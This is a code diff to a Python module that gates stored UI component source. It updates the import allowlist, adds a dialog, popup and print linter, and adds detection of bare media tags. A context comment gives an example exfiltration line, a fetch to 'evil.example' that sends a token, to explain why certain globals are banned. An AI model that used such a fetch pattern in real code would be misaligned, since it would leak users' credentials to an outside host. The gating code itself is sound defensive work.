@@ -69,8 +69,9 @@ SHAPE_AUTHORING_SKILL = "shape-authoring"
 SHAPE_AUTHORING_POINTER = "Follow the shape-authoring skill in your instructions."
 
 # ── The component import allowlist.
-#    CROSS-REPO MIRROR of matrx-frontend
-#    features/agent-apps/utils/allowed-imports.ts (ALLOWED_IMPORTS_CONFIG) —
+#    CROSS-REPO MIRROR of `allowedImports` in aidream
+#    apps/shared/code-runtime/src/gate-lists.json (the machine-readable gate
+#    lists; the documented scope registry is the truth) —
 #    the ONE in-page compiler scope every DB kind component runs in. The
 #    browser does NOT crash on an unknown import: it console.warns, skips it,
 #    and the identifier resolves to undefined — so the component breaks at
@@ -95,7 +96,12 @@ COMPONENT_ALLOWED_IMPORTS: frozenset[str] = frozenset(
         "@/components/kind-kit/KindPanelGrid",
         "@/components/kind-kit/KindPanel",
         "@/components/kind-kit/KindActionButton",
+        "@/components/kind-kit/KindFile",
         "@/components/kind-kit/KindImage",
+        "@/components/kind-kit/KindVideo",
+        "@/components/kind-kit/KindAudio",
+        "@/components/kind-kit/KindEmbed",
+        "@/components/kind-kit/KindLocale",
         "@/components/kind-kit/KindHeaderBar",
         "@/components/kind-kit/StreamingSkeleton",
         "@/components/kind-kit/TagList",
@@ -186,8 +192,8 @@ def component_import_lint(source: str) -> str | None:
 # may name at all — because `fetch("https://evil.example", {body: token})` needs
 # no import.
 #
-# THE LISTS ARE SHARED, not similar. The canonical copy is matrx-frontend
-# `features/agent-apps/utils/component-source-gate.json`, and
+# THE LISTS ARE SHARED, not similar. The canonical copy is aidream
+# `apps/shared/code-runtime/src/gate-lists.json`, and
 # `tests/test_component_source_gate_parity.py` fails if these four constants
 # ever stop being byte-identical to it. Edit the JSON and both runtimes
 # together, never one of them.
@@ -244,6 +250,13 @@ COMPONENT_BANNED_COMPUTED_ACCESS: tuple[str, ...] = ("globalThis", "self", "wind
 # enforcement points can be compared. `dynamicImport` = `import(...)`.
 COMPONENT_BANNED_SYNTAX: tuple[str, ...] = ("dynamicImport",)
 
+# Shape rules, not security lists: a sealed frame has no browser dialogs, popups
+# or printing, so these calls are refused at save with a sentence pointing to
+# the kit. `window.<name>(` (also `globalThis.` / `self.`) for every name; the
+# bare call for the three dialogs, unless the file declares that name itself.
+COMPONENT_BANNED_WINDOW_CALLS: tuple[str, ...] = ("alert", "confirm", "open", "print", "prompt")
+COMPONENT_BANNED_BARE_CALLS: tuple[str, ...] = ("alert", "confirm", "prompt")
+
 _DYNAMIC_IMPORT_RE = re.compile(r"(?<![.\w$])import\s*\(")
 
 
@@ -277,6 +290,30 @@ def _banned_computed_access_message(name: str) -> str:
     )
 
 
+def _banned_dialog_message(name: str) -> str:
+    return (
+        f'This component calls "{name}(", which a shape cannot use: inside its sealed frame '
+        "browser dialogs, new windows and printing do nothing. Use the kit instead: a Dialog or "
+        'KindActionButton confirm to ask, an <a href> or runAction("open_url") to open a link, '
+        'runAction("print") to print and runAction("download") to save a file.'
+    )
+
+
+def component_dialog_lint(source: str) -> str | None:
+    """Refuse browser dialogs, popups and printing (the TS gate's `bannedDialogCall`)."""
+    code = source or ""
+    for name in COMPONENT_BANNED_WINDOW_CALLS:
+        if re.search(rf"(?<![.\w$])(?:window|globalThis|self)\s*\.\s*{re.escape(name)}\s*\(", code):
+            return _banned_dialog_message(name)
+    for name in COMPONENT_BANNED_BARE_CALLS:
+        escaped = re.escape(name)
+        if re.search(rf"\b(?:function|const|let|var)\s+{escaped}\b", code):
+            continue
+        if re.search(rf"(?<![.\w$]){escaped}\s*\(", code):
+            return _banned_dialog_message(name)
+    return None
+
+
 def component_globals_lint(source: str) -> str | None:
     """Refuse the globals that let a stored component read or send whatever the
     signed-in page can see. Returns the refusal message naming the offending
@@ -307,7 +344,7 @@ def component_globals_lint(source: str) -> str | None:
             rf"\.\s*{re.escape(name)}\s*\[", code
         ):
             return _banned_computed_access_message(name)
-    return None
+    return component_dialog_lint(code)
 
 
 _ESBUILD_UNAVAILABLE_NOTE = (
@@ -358,6 +395,35 @@ async def tsx_compile_check(source: str) -> tuple[list[str], bool]:
     text = (stderr or b"").decode(errors="replace").strip()
     errors = [line for line in text.splitlines() if line.strip()][:20]
     return errors or ["esbuild reported a syntax error with no message"], True
+
+
+#: Bare media tags the compiler converts to kit pieces (code-runtime ``src/media-kit.ts``).
+_BARE_MEDIA_TAG = re.compile(r"<(img|video|audio|iframe)(?=[\s/>])([^>]*)>", re.IGNORECASE)
+_DATA_URI_SRC = re.compile(r"""\bsrc\s*=\s*(?:\{\s*)?["'`]\s*data:""", re.IGNORECASE)
+
+
+def bare_media_tag_count(source: str) -> int:
+    """How many bare ``<img>`` / ``<video>`` / ``<audio>`` / ``<iframe>`` tags a body writes.
+    A literal ``data:`` image is allowed by the rulebook and is not counted. Detection only —
+    the conversion itself is the compiler's (a real parser), never this pattern."""
+    count = 0
+    for m in _BARE_MEDIA_TAG.finditer(source or ""):
+        if m.group(1).lower() == "img" and _DATA_URI_SRC.search(m.group(2)):
+            continue
+        count += 1
+    return count
+
+
+def bare_media_notices(source: str | None) -> list[str]:
+    """The one save-time line for bare media (never a refusal)."""
+    n = bare_media_tag_count(source or "")
+    if not n:
+        return []
+    tags = "tag is" if n == 1 else "tags are"
+    return [
+        f"{n} bare media {tags} converted to the kit automatically at render; "
+        "use KindImage/KindVideo/KindAudio/KindEmbed directly."
+    ]
 
 
 def component_source_lint(source: str) -> str | None:
